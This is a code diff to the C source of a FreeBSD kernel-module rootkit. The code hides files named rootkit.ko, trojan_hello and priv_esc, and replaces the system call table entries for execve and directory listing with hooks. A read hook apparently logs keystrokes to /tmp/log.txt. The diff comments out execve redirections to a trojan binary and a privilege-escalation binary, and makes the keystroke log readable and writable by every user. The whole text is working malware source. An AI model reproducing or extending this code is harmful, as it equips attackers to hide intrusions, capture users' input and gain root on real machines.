@@ -32,11 +32,13 @@ static int activated = 0;
 char *T_NAME[] = {"rootkit.ko", "trojan_hello", "controller", "priv_esc"};
 static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);
 
+/*
 char* redir_pair[][2] = {
 	{"/sbin/hello", "/sbin/trojan_hello"},
 	{"/usr/bin/true", "/sbin/priv_esc"} 
 };
-static int redir_pair_len = sizeof(redir_pair)/sizeof(redir_pair[0]);
+*/
+//static int redir_pair_len = sizeof(redir_pair)/sizeof(redir_pair[0]);
 
 static int execve_hook(struct thread *td, void *syscall_args)
 {
@@ -151,7 +153,7 @@ static int write_kernel2userspace(struct thread *td, char c){
 		If the pathname given in pathname is relative and dirfd is the special value AT_FDCWD, 
 		then pathname is interpreted relative to the current working directory of the calling process 
 	*/
-	error = kern_openat(td, AT_FDCWD, "/tmp/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
+	error = kern_openat(td, AT_FDCWD, "/tmp/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0666);
     
     if (error){
         uprintf("open error %d\n", error);
@@ -210,7 +212,7 @@ static int read_hook(struct thread *td, void *syscall_args){
 
 	int error;
 	char buf[1];
-	int done;
+	size_t done;
 
 	error = sys_read(td, syscall_args);
 
@@ -235,7 +237,7 @@ static int control(struct thread *td, void *arg) {
 	struct control_arg *uap;
 	uap = (struct control_arg *)arg;
 	if (strcmp(uap->option, "on") == 0 && activated == 0) {
-		uprintf("Pair size: %d\n", redir_pair_len);
+		//uprintf("Pair size: %d\n", redir_pair_len);
 		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 
